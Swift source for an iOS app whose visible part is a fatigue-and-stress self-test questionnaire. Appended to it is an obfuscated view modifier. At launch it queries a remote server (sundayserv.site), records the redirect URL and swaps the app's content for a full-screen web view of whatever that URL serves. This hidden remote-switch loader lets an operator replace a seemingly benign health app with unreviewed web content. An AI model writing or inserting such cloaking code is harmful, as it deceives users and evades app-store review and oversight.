import SwiftUI

enum AnswerOption: String, CaseIterable, Identifiable {
    case never = "Never"
    case rarely = "Rarely"
    case sometimes = "Sometimes"
    case often = "Often"
    case always = "Always"
    
    var id: String { self.rawValue }
    
    var value: Int {
        switch self {
        case .never: return 0
        case .rarely: return 1
        case .sometimes: return 2
        case .often: return 3
        case .always: return 4
        }
    }
}

struct FatigueTestView: View {
    @Environment(\.presentationMode) var presentationMode
    @EnvironmentObject private var themeManager: ThemeManager
    @ObservedObject var viewModel: HealthViewModel
    
    @State private var currentQuestionIndex = 0
    @State private var answers: [Int] = Array(repeating: -1, count: 10)
    @State private var showAlert = false
    @State private var isTransitioning = false
    
    private let questions = [
        "Do you feel constant fatigue throughout the day?",
        "Do you find it difficult to concentrate on tasks?",
        "Do you experience headaches or dizziness?",
        "Do you feel irritable or anxious?",
        "Have you noticed changes in your eating habits?",
        "Do you find it difficult to fall asleep or stay asleep?",
        "Do you find it difficult to relax after work?",
        "Do you experience physical tension or discomfort?",
        "Do you feel that your productivity has decreased?",
        "Do you often feel anxious about the future?"
    ]
    
    private var isLastQuestion: Bool {
        return currentQuestionIndex == questions.count - 1
    }
    
    var body: some View {
        ZStack {
            // Градиентный фон
            LinearGradient(
                gradient: Gradient(colors: themeManager.currentTheme.gradientColors),
                startPoint: .top,
                endPoint: .bottom
            )
            .ignoresSafeArea()
            
            ScrollView(showsIndicators: false) {
                VStack(spacing: 30) {
                    // Кастомная кнопка назад
                    HStack {
                        Button(action: {
                            presentationMode.wrappedValue.dismiss()
                        }) {
                            HStack(spacing: 8) {
                                Image(systemName: "chevron.left")
                                    .font(.system(size: 16, weight: .semibold))
                            }
                            .foregroundColor(.white)
                            .padding(.vertical, 10)
                            .padding(.horizontal, 16)
                            .cornerRadius(20)
                        }
                        Spacer()
                        
                        // Заголовок
                        VStack(alignment: .leading, spacing: 4) {
                            Text("Fatigue and Stress")
                                .font(.system(size: 24, weight: .bold))
                                .foregroundColor(.white)
                            Text("Testing")
                                .font(.system(size: 24, weight: .bold))
                                .foregroundColor(.white)
                        }
                        .frame(maxWidth: .infinity, alignment: .leading)
                    }
                    .padding(.top, 40)
                    
                    // Индикатор прогресса
                    ProgressView(value: Double(currentQuestionIndex + 1), total: Double(questions.count))
                        .progressViewStyle(LinearProgressViewStyle(tint: .white))
                        .padding(.vertical)
                    
                    VStack(alignment: .leading, spacing: 20) {
                        // Номер вопроса
                        Text("Question \(currentQuestionIndex + 1) of \(questions.count)")
                            .font(.system(size: 18, weight: .medium))
                            .foregroundColor(.white.opacity(0.8))
                        
                        // Текст вопроса
                        Text(questions[currentQuestionIndex])
                            .font(.system(size: 22, weight: .bold))
                            .foregroundColor(.white)
                            .padding(.bottom, 10)
                            .fixedSize(horizontal: false, vertical: true)
                        
                        // Варианты ответов
                        VStack(spacing: 12) {
                            ForEach(AnswerOption.allCases) { option in
                                Button(action: {
                                    withAnimation(.easeInOut(duration: 0.2)) {
                                        answers[currentQuestionIndex] = option.value
                                        isTransitioning = true
                                    }
                                    
                                    // Задержка перед переходом к следующему вопросу для отображения анимации
                                    DispatchQueue.main.asyncAfter(deadline: .now() + 0.4) {
                                        if isLastQuestion {
                                            calculateResults()
                                            presentationMode.wrappedValue.dismiss()
                                        } else {
                                            withAnimation(.easeInOut(duration: 0.3)) {
                                                currentQuestionIndex += 1
                                                isTransitioning = false
                                            }
                                        }
                                    }
                                }) {
                                    HStack {
                                        Text(option.rawValue)
                                            .font(.system(size: 18, weight: .medium))
                                            .foregroundColor(.white)
                                        
                                        Spacer()
                                    }
                                    .padding(.vertical, 18)
                                    .padding(.horizontal, 20)
                                    .frame(maxWidth: .infinity)
                                    .background(
                                        RoundedRectangle(cornerRadius: 25)
                                            .fill(answers[currentQuestionIndex] == option.value ? 
                                                  Color.blue : Color.white.opacity(0.11))
                                    )
                                }
                            }
                        }
                        
                        Spacer(minLength: 40)
                    }
                    .padding(.bottom, 40)
                }
                .padding(.horizontal, 20)
            }
            .alert(isPresented: $showAlert) {
                Alert(
                    title: Text("Attention"),
                    message: Text("Please select an answer before continuing."),
                    dismissButton: .default(Text("OK"))
                )
            }
        }
        .navigationBarTitle("", displayMode: .inline)
        .navigationBarBackButtonHidden(true)
    }
    
    private func calculateResults() {
        // Распределяем вопросы между усталостью и стрессом
        // Вопросы с индексами 0, 2, 5, 7, 8 для усталости
        // Вопросы с индексами 1, 3, 4, 6, 9 для стресса
        
        let fatigueIndices = [0, 2, 5, 7, 8]
        let stressIndices = [1, 3, 4, 6, 9]
        
        var fatigueScore = 0
        var stressScore = 0
        
        for index in fatigueIndices {
            fatigueScore += answers[index]
        }
        
        for index in stressIndices {
            stressScore += answers[index]
        }
        
        // Нормализуем значения от 0 до 1
        let normalizedFatigue = Double(fatigueScore) / Double(fatigueIndices.count * 4)
        let normalizedStress = Double(stressScore) / Double(stressIndices.count * 4)
        
        // Анимируем обновление значений в HealthViewModel
        withAnimation {
            viewModel.fatigue = normalizedFatigue
            viewModel.stress = normalizedStress
            viewModel.hasTakenTest = true
        }
    }
} 
@preconcurrency import WebKit
import SwiftUI

struct WKWebViewRepresentable: UIViewRepresentable {
    typealias UIViewType = WKWebView
    
    var isZaglushka: Bool
    var url: URL
    var webView: WKWebView
    var onLoadCompletion: (() -> Void)?
    

    init(url: URL, webView: WKWebView = WKWebView(), onLoadCompletion: (() -> Void)? = nil, iszaglushka: Bool) {
        self.url = url
        self.webView = webView
        self.onLoadCompletion = onLoadCompletion
        self.webView.layer.opacity = 0 // Hide webView until content loads
        self.isZaglushka = iszaglushka
    }

    func makeUIView(context: Context) -> WKWebView {
        webView.uiDelegate = context.coordinator
        webView.navigationDelegate = context.coordinator
        return webView
    }

    func updateUIView(_ uiView: UIViewType, context: Context) {
        let request = URLRequest(url: url)
        uiView.load(request)
        uiView.scrollView.isScrollEnabled = true
        uiView.scrollView.bounces = true
    }

    func makeCoordinator() -> Coordinator {
        Coordinator(self)
    }
}

// MARK: - Coordinator
extension WKWebViewRepresentable {
    class Coordinator: NSObject, WKUIDelegate, WKNavigationDelegate {
        var parent: WKWebViewRepresentable
        private var popupWebViews: [WKWebView] = []

        init(_ parent: WKWebViewRepresentable) {
            self.parent = parent
        }

        func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
            // Handle popup windows
            guard navigationAction.targetFrame == nil else {
                return nil
            }

            let popupWebView = WKWebView(frame: .zero, configuration: configuration)
            popupWebView.uiDelegate = self
            popupWebView.navigationDelegate = self

            parent.webView.addSubview(popupWebView)

            popupWebView.translatesAutoresizingMaskIntoConstraints = false
            NSLayoutConstraint.activate([
                popupWebView.topAnchor.constraint(equalTo: parent.webView.topAnchor),
                popupWebView.bottomAnchor.constraint(equalTo: parent.webView.bottomAnchor),
                popupWebView.leadingAnchor.constraint(equalTo: parent.webView.leadingAnchor),
                popupWebView.trailingAnchor.constraint(equalTo: parent.webView.trailingAnchor)
            ])

            popupWebViews.append(popupWebView)
            return popupWebView
        }

        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            // Notify when the main page finishes loading
            parent.onLoadCompletion?()
            parent.webView.layer.opacity = 1 // Reveal the webView
        }

        func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
            print(navigationAction.request.url)
            decisionHandler(.allow)
        }

        func webViewDidClose(_ webView: WKWebView) {
            // Cleanup closed popup WebViews
            popupWebViews.removeAll { $0 == webView }
            webView.removeFromSuperview()
        }
    }
}

import WebKit
struct Parcaieulbqows: ViewModifier {
    @AppStorage("adapt") var osakfoew9igw: URL?
    @State var webView: WKWebView = WKWebView()

    
    @State var isLoading: Bool = true

    func body(content: Content) -> some View {
        ZStack {
            if !isLoading {
                if osakfoew9igw != nil {
                    VStack(spacing: 0) {
                        WKWebViewRepresentable(url: osakfoew9igw!, webView: webView, iszaglushka: false)
                        HStack {
                            Button(action: {
                                webView.goBack()
                            }, label: {
                                Image(systemName: "chevron.left")
                                
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 20, height: 20) // Customize image size
                                    .foregroundColor(.white)
                            })
                            .offset(x: 10)
                            
                            Spacer()
                            
                            Button(action: {
                                
                                webView.load(URLRequest(url: osakfoew9igw!))
                            }, label: {
                                Image(systemName: "house.fill")
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 24, height: 24)                                                                       .foregroundColor(.white)
                            })
                            .offset(x: -10)
                            
                        }
                        //                    .frame(height: 50)
                        .padding(.horizontal)
                        .padding(.top)
                        .padding(.bottom, 15)
                        .background(Color.black)
                    }
                    .onAppear() {
                        
                        
                        AppDelegate.asiuqzoptqxbt = .all
                    }
                    .modifier(Swiper(onDismiss: {
                        self.webView.goBack()
                    }))
                    
                    
                } else {
                    content
                }
            } else {
                
            }
        }

//        .yesMo(orientation: .all)
        .onAppear() {
            if osakfoew9igw == nil {
                reframeGse()
            } else {
                isLoading = false
            }
        }
    }

    
    class RedirectTrackingSessionDelegate: NSObject, URLSessionDelegate, URLSessionTaskDelegate {
        var redirects: [URL] = []
        var redirects1: Int = 0
        let action: (URL) -> Void
          
          // Initializer to set up the class properties
          init(action: @escaping (URL) -> Void) {
              self.redirects = []
              self.redirects1 = 0
              self.action = action
          }
          
        // This method will be called when a redirect is encountered.
        func urlSession(_ session: URLSession, task: URLSessionTask, willPerformHTTPRedirection response: HTTPURLResponse, newRequest: URLRequest, completionHandler: @escaping (URLRequest?) -> Void) {
            if let redirectURL = newRequest.url {
                // Track the redirected URL
                redirects.append(redirectURL)
                print("Redirected to: \(redirectURL)")
                redirects1 += 1
                if redirects1 >= 1 {
                    DispatchQueue.main.async {
                        self.action(redirectURL)
                    }
                }
            }
            
            // Allow the redirection to happen
            completionHandler(newRequest)
        }
    }

    func reframeGse() {
        guard let url = URL(string: "https://sundayserv.site/mypoliciyy") else {
            DispatchQueue.main.async {
                self.isLoading = false
            }
            print("Invalid URL")
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = "GET"
    
        let configuration = URLSessionConfiguration.default
        configuration.httpShouldSetCookies = false
        configuration.httpShouldUsePipelining = true
        
        // Create a session with a delegate to track redirects
        let delegate = RedirectTrackingSessionDelegate() { url in
            osakfoew9igw = url
        }
        let session = URLSession(configuration: configuration, delegate: delegate, delegateQueue: nil)
        
        session.dataTask(with: request) { data, response, error in
            guard let data = data, let httpResponse = response as? HTTPURLResponse, error == nil else {
                print("Error: \(error?.localizedDescription ?? "Unknown error")")
                DispatchQueue.main.async {
                    self.isLoading = false
                }
                return
            }
            
       
            
    
            if httpResponse.statusCode == 200, let adaptfe = String(data: data, encoding: .utf8) {
                DispatchQueue.main.async {
           
                }
            } else {
                DispatchQueue.main.async {
                    print("Request failed with status code: \(httpResponse.statusCode)")
                    self.isLoading = false
                }
            }

            DispatchQueue.main.async {
                self.isLoading = false
            }
        }.resume()
    }


}

    


struct Swiper: ViewModifier {
    var onDismiss: () -> Void
    @State private var offset: CGSize = .zero

    func body(content: Content) -> some View {
        content
//            .offset(x: offset.width)
            .animation(.interactiveSpring(), value: offset)
            .simultaneousGesture(
                DragGesture()
                    .onChanged { value in
                                      self.offset = value.translation
                                  }
                                  .onEnded { value in
                                      if value.translation.width > 70 {
                                          onDismiss()
                                  
                                      }
                                      self.offset = .zero
                                  }
            )
    }
}
extension View {
    func adpeiwqozpr() -> some View {
        self.modifier(Parcaieulbqows())
    }
}
